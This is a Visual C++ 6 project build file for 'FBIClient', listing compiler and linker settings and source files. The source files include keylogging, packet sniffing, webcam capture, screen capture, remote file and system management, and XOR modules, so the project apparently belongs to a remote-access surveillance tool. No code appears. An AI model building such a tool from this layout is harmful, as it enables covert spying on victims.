# Microsoft Developer Studio Project File - Name="FBIClient" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=FBIClient - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "FBIClient.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "FBIClient.mak" CFG="FBIClient - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "FBIClient - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "FBIClient - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "FBIClient - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x809 /d "NDEBUG"
# ADD RSC /l 0x809 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib comctl32.lib /nologo /subsystem:windows /machine:I386 /out:"Release/Client.exe" /FORCE:MULTIPLE
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "FBIClient - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x809 /d "_DEBUG"
# ADD RSC /l 0x809 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib comctl32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept /FORCE:MULTIPLE
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "FBIClient - Win32 Release"
# Name "FBIClient - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\FBISocket.cpp
# End Source File
# Begin Source File

SOURCE=".\File Manager.cpp"
# End Source File
# Begin Source File

SOURCE=.\FileSocket.cpp
# End Source File
# Begin Source File

SOURCE=.\Keylog.cpp
# End Source File
# Begin Source File

SOURCE=.\Main.cpp
# End Source File
# Begin Source File

SOURCE=.\MainGui.cpp
# End Source File
# Begin Source File

SOURCE=.\PacketSniff.cpp
# End Source File
# Begin Source File

SOURCE=.\ParseData.cpp
# End Source File
# Begin Source File

SOURCE=.\Screen.cpp
# End Source File
# Begin Source File

SOURCE=.\ServerManager.cpp
# End Source File
# Begin Source File

SOURCE=.\SystemManager.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCam.cpp
# End Source File
# Begin Source File

SOURCE=.\Xor.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\Information.h
# End Source File
# Begin Source File

SOURCE=.\Main.h
# End Source File
# Begin Source File

SOURCE=.\MyJPEGHandler.h
# End Source File
# Begin Source File

SOURCE=.\PacketHead.h
# End Source File
# Begin Source File

SOURCE=.\resource.h
# End Source File
# Begin Source File

SOURCE=.\Settings.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\21_ico_1.ico
# End Source File
# Begin Source File

SOURCE=.\arrow_down.ico
# End Source File
# Begin Source File

SOURCE=.\arrow_up.ico
# End Source File
# Begin Source File

SOURCE=.\ArrowBack.ico
# End Source File
# Begin Source File

SOURCE=.\CD.ico
# End Source File
# Begin Source File

SOURCE=".\Default Document_ico_3.ico"
# End Source File
# Begin Source File

SOURCE=.\default1.bin
# End Source File
# Begin Source File

SOURCE=.\Disk.ico
# End Source File
# Begin Source File

SOURCE=".\display-32x32.ico"
# End Source File
# Begin Source File

SOURCE=.\film.ico
# End Source File
# Begin Source File

SOURCE=.\Folder.ico
# End Source File
# Begin Source File

SOURCE=".\Hard Drive_ico_5.ico"
# End Source File
# Begin Source File

SOURCE=.\image.ico
# End Source File
# Begin Source File

SOURCE=.\NetWork.ico
# End Source File
# Begin Source File

SOURCE=.\progman_exe_Ico22_ico_Ico1.ico
# End Source File
# Begin Source File

SOURCE=.\Project3.ico
# End Source File
# Begin Source File

SOURCE=.\Resource.rc
# End Source File
# End Group
# End Target
# End Project
